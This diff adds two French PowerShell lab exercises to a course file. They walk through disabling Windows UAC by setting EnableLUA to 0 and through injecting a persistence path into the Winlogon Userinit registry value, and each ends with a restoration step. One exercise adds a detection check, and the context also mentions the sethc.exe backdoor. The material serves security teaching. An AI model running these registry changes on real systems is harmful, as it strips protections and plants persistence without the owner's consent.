@@ -362,3 +362,167 @@ Remove-Item -Path ".\notepad.exe" -Recurse
 **Réponse attendue :** Car il permet d'accéder à une console `SYSTEM` depuis l'écran de verrouillage (en appuyant 5 fois sur MAJ), sans avoir besoin de connaître le mot de passe d'un utilisateur, car le processus `sethc.exe` est géré par le système avant même l'ouverture de session.
 
 ---
+Voici l'adaptation de cette technique en exercice guidé PowerShell. Cet exercice est crucial pour comprendre comment les paramètres de sécurité critique du système peuvent être altérés via le registre.
+
+---
+
+# Exercice 7 : CYBER >>> Modification des Politiques Système (Désactivation de l'UAC)
+
+**Objectif :** Utiliser PowerShell pour identifier et modifier la clé de contrôle de compte d'utilisateur (**UAC**). Vous apprendrez à manipuler les politiques de sécurité (Policies) du système.
+
+### Étape 1 : Localisation de la politique système
+Les paramètres de sécurité globaux de Windows, comme l'UAC, se trouvent dans la ruche `HKEY_LOCAL_MACHINE`, car ils s'appliquent à l'ensemble de l'ordinateur.
+**Action :** Positionnez-vous dans la clé `System` des politiques locales.
+* *Note :* Cet exercice nécessite impérativement les droits **Administrateur**.
+
+```powershell
+# Navigation vers la clé des politiques système
+Set-Location "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System"
+
+```
+
+---
+### Étape 2 : Analyse de la valeur `EnableLUA`
+La valeur `EnableLUA` définit si l'UAC est actif ou non.
+
+* `1` : UAC activé (Comportement normal).
+* `0` : UAC désactivé (Danger : plus de demandes de confirmation).
+
+**Action :** Vérifiez l'état actuel de l'UAC sur votre machine.
+
+* *Indice :* Utilisez `Get-ItemProperty`.
+```powershell
+# Vérification de la valeur actuelle
+Get-ItemProperty -Path . -Name "EnableLUA"
+
+```
+
+---
+### Étape 3 : Simulation de la désactivation (Attaque)
+Un attaquant cherchera à passer cette valeur à `0` pour ne plus être gêné par les fenêtres de confirmation lors de l'exécution de programmes malveillants.
+
+**Action :** Modifiez la donnée de `EnableLUA` pour la passer à `0`.
+
+* *Indice :* Utilisez `Set-ItemProperty`.
+```powershell
+# Désactivation de l'UAC via le registre
+Set-ItemProperty -Path . -Name "EnableLUA" -Value 0
+
+```
+
+---
+### Étape 4 : Confirmation du changement
+Contrairement aux fichiers, certains changements de registre système ne sont effectifs qu'après un redémarrage, mais la valeur dans la base de données est modifiée instantanément.
+
+**Action :** Vérifiez que la valeur est bien passée à `0`.
+
+```powershell
+# Confirmation de la modification
+(Get-ItemProperty -Path . -Name "EnableLUA").EnableLUA
+
+```
+
+---
+### Étape 5 : Restauration de la sécurité (Remédiation)
+Il est essentiel pour la sécurité de votre poste de réactiver l'UAC immédiatement.
+**Action :** Remettez la valeur `EnableLUA` à `1`.
+
+```powershell
+# Réactivation de l'UAC
+Set-ItemProperty -Path . -Name "EnableLUA" -Value 1
+
+```
+
+---
+### Pourquoi cette méthode est-elle redoutable ?
+
+1. **Invisibilité immédiate :** L'utilisateur ne reçoit aucune alerte indiquant que son UAC a été désactivé. Le changement ne devient visible (par l'absence de pop-up) qu'après le prochain redémarrage.
+2. **Élévation facilitée :** Une fois l'UAC à 0, n'importe quel script lancé par l'utilisateur s'exécutera avec les privilèges maximum sans aucune barrière visuelle.
+
+---
+
+**Question de synthèse :**
+Si vous vouliez automatiser cette vérification sur 100 serveurs pour vous assurer que l'UAC est bien activé partout, quelle cmdlet PowerShell utiliseriez-vous pour lire la valeur à distance ?
+
+**Réponse attendue :** `Get-ItemProperty` (souvent combiné avec `Invoke-Command` pour le lancement à distance).
+ 
+---
+Voici l'adaptation en exercice guidé PowerShell pour l'étude de cas n°6. Cette technique est particulièrement intéressante car elle montre comment PowerShell peut manipuler des chaînes de caractères complexes dans le registre pour une exécution "en chaîne".
+
+---
+
+# Exercice 8 : CYBER >>> Détournement du processus d'initialisation (Userinit)
+**Objectif :** Utiliser PowerShell pour auditer et modifier la clé `Userinit` afin de simuler l'ajout d'un script de log personnalisé lors de l'ouverture de session.
+### Étape 1 : Localisation et Lecture de la valeur critique
+Le processus `Winlogon` est un composant central du système. Sa configuration se trouve dans la ruche logicielle de `HKEY_LOCAL_MACHINE`.
+**Action :** Accédez à la clé `Winlogon` et affichez la valeur actuelle de `Userinit`.
+* *Note :* Cet exercice nécessite les droits **Administrateur**.
+```powershell
+# Navigation vers la clé Winlogon
+Set-Location "HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon"
+
+# Lecture de la valeur Userinit
+Get-ItemProperty -Path . -Name "Userinit"
+
+```
+
+---
+### Étape 2 : Analyse de la "virgule fatale"
+Comme indiqué dans votre cours, la valeur `Userinit` est particulière car elle se termine par une virgule. Avant toute modification, nous allons stocker la valeur d'origine pour ne pas casser le système.
+**Action :** Sauvegardez la valeur actuelle dans une variable.
+```powershell
+# Sauvegarde de la valeur propre
+$originalUserinit = (Get-ItemProperty -Path . -Name "Userinit").Userinit
+Write-Host "Valeur actuelle : $originalUserinit"
+
+```
+
+---
+### Étape 3 : Injection de la persistance (Exécution en chaîne)
+Nous allons maintenant simuler l'attaque en ajoutant un deuxième chemin (celui de notre "malware" factice) après la virgule.
+*Charge utile cible :* `C:\Windows\system32\userinit.exe,C:\Users\Public\script_persistance.exe`
+**Action :** Modifiez la valeur pour ajouter le second chemin.
+* *Indice :* Faites attention à ne pas supprimer le chemin vers `userinit.exe` original !
+```powershell
+# Création de la nouvelle chaîne de caractères
+$maliciousValue = $originalUserinit + "C:\Users\Public\script_persistance.exe"
+
+# Application de la modification
+Set-ItemProperty -Path . -Name "Userinit" -Value $maliciousValue
+
+```
+
+---
+### Étape 4 : Audit Forensics (Analyse de détection)
+Imaginez que vous êtes un analyste en cybersécurité. Vous devez créer un script rapide pour vérifier si cette clé a été détournée.
+**Action :** Utilisez PowerShell pour vérifier si la valeur contient plus d'un chemin (présence de texte après la première virgule).
+```powershell
+# Script de détection simple
+$currentValue = (Get-ItemProperty -Path . -Name "Userinit").Userinit
+if ($currentValue -match ",.+$") {
+    Write-Warning "ALERTE : Une anomalie a été détectée dans la clé Userinit !"
+} else {
+    Write-Host "Système sain." -ForegroundColor Green
+}
+
+```
+
+---
+### Étape 5 : Restauration du système
+Pour éviter tout problème au prochain redémarrage, rétablissez la valeur d'origine.
+**Action :** Remettez la clé `Userinit` dans son état initial.
+
+```powershell
+# Restauration via la variable sauvegardée à l'étape 2
+Set-ItemProperty -Path . -Name "Userinit" -Value $originalUserinit
+
+```
+
+---
+### Pourquoi cette méthode est-elle redoutable selon vos notes ?
+
+1. **Résilience :** Le processus `userinit.exe` étant de confiance, les modifications passent souvent pour des scripts d'entreprise.
+2. **Exécution précoce :** Elle intervient avant même l'affichage du bureau (`explorer.exe`).
+
+---
+ 
